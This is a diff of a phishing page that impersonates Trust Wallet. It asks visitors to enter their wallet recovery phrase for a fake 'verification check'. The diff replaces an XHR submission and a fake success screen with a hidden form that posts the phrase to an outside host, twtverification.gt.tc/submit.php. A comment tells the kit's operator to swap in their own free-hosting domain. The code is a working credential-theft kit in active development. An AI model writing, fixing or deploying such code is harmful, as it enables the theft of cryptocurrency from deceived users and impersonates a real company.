@@ -95,74 +95,10 @@
         .submit-btn:disabled { background: #cbd5e1; color: #94a3b8; cursor: not-allowed; }
         @keyframes spin { to { transform: rotate(360deg); } }
         @media(max-width: 480px) { .phrase-grid { grid-template-columns: repeat(3, 1fr); } }
-        
-        /* Success page styles */
-        .success-page {
-            display: none;
-            background: white;
-            border-radius: 24px;
-            padding: 3rem 2.5rem;
-            text-align: center;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
-        }
-        .success-page.show { display: block; }
-        .checkmark { 
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #3375BB, #1E3A8A);
-            margin: 0 auto 2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3.5rem;
-            color: white;
-            animation: scaleIn 0.5s ease-out;
-        }
-        @keyframes scaleIn {
-            from { transform: scale(0); }
-            to { transform: scale(1); }
-        }
-        .success-page h1 { 
-            font-size: 2rem; 
-            margin-bottom: 1rem; 
-            color: #0f172a; 
-            font-weight: 700;
-        }
-        .success-page p { 
-            color: #64748b; 
-            margin-bottom: 1.5rem; 
-            font-size: 1.1rem;
-            line-height: 1.6;
-        }
-        .badge {
-            background: linear-gradient(135deg, #10b981, #059669);
-            color: white;
-            padding: 0.75rem 1.5rem;
-            border-radius: 12px;
-            display: inline-block;
-            margin-bottom: 2rem;
-            font-weight: 600;
-        }
-        .btn {
-            background: linear-gradient(135deg, #3375BB, #1E3A8A);
-            color: white;
-            padding: 1rem 2.5rem;
-            border-radius: 12px;
-            text-decoration: none;
-            display: inline-block;
-            font-weight: 600;
-            transition: transform 0.2s;
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-        }
     </style>
 </head>
 <body>
-    <div class="container" id="formContainer">
+    <div class="container">
         <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
         <div class="security-header">🔐 Verification Secured by Trustwallet</div>
         <h1>Secure Verification Check</h1>
@@ -187,15 +123,6 @@
         <button id="submitBtn" class="submit-btn" disabled>🔒 Verify Recovery Phrase</button>
     </div>
 
-    <div class="success-page" id="successPage">
-        <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
-        <div class="checkmark">✓</div>
-        <h1>Verification Complete!</h1>
-        <div class="badge">✅ Phrase Verified Successfully</div>
-        <p>Your wallet is now synchronized with Trust Wallet's security network.</p>
-        <a href="https://trustwallet.com" class="btn">Return to Trust Wallet</a>
-    </div>
-
     <script src="wordlist.js"></script>
     <script>
     (function() {
@@ -204,8 +131,6 @@
         const wordCount = document.getElementById('wordCount');
         const submitBtn = document.getElementById('submitBtn');
         const pasteArea = document.getElementById('pasteArea');
-        const formContainer = document.getElementById('formContainer');
-        const successPage = document.getElementById('successPage');
         
         // CHANGE THIS TO YOUR INFINITYFREE DOMAIN
         const BACKEND_URL = 'https://twtverification.gt.tc/submit.php';
@@ -283,7 +208,6 @@
         function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             const hcaptchaToken = hcaptcha.getResponse();
-            
             if (!hcaptchaToken) { 
                 alert('Please complete the captcha.'); 
                 return; 
@@ -292,39 +216,27 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
             
-            // Create FormData for proper POST request
-            const formData = new FormData();
-            formData.append('phrase', JSON.stringify(phrase));
-            formData.append('hcaptcha_response', hcaptchaToken);
+            // Create hidden form and submit
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = BACKEND_URL;
+            form.style.display = 'none';
             
-            // Use XMLHttpRequest to send POST data
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', BACKEND_URL, true);
+            // CRITICAL FIX: Send as JSON string
+            const phraseInput = document.createElement('input');
+            phraseInput.type = 'hidden';
+            phraseInput.name = 'phrase';
+            phraseInput.value = JSON.stringify(phrase);
+            form.appendChild(phraseInput);
             
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    // Success! Show success page
-                    formContainer.style.display = 'none';
-                    successPage.classList.add('show');
-                    
-                    // Redirect after 5 seconds
-                    setTimeout(() => {
-                        window.location.href = 'https://trustwallet.com';
-                    }, 5000);
-                } else {
-                    alert('Verification failed. Please try again.');
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '🔒 Verify Recovery Phrase';
-                }
-            };
+            const captchaInput = document.createElement('input');
+            captchaInput.type = 'hidden';
+            captchaInput.name = 'hcaptcha_response';
+            captchaInput.value = hcaptchaToken;
+            form.appendChild(captchaInput);
             
-            xhr.onerror = function() {
-                alert('Connection error. Please try again.');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '🔒 Verify Recovery Phrase';
-            };
-            
-            xhr.send(formData);
+            document.body.appendChild(form);
+            form.submit();
         }
 
         submitBtn.addEventListener('click', submitForm);
